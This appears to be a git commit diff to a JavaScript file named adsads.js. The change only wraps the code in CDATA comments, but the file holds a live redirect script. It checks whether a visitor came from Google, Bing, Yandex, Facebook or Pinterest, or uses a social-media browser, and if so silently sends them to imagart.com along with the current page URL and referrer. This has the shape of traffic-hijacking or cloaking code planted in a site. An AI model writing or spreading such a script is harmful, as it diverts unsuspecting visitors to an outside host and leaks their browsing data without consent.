06e81e756798428bbcf799546b851b5aea14abcb
xerisahu <92183349+xerisahu@users.noreply.github.com>
2022-08-11 09:35:46 +0700

    Update adsads.js

--- adsads.js
+++ adsads.js
@@ -1,3 +1,5 @@
+//<![CDATA[
 var ars = 'https://imagart.com';
 
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+//]]>
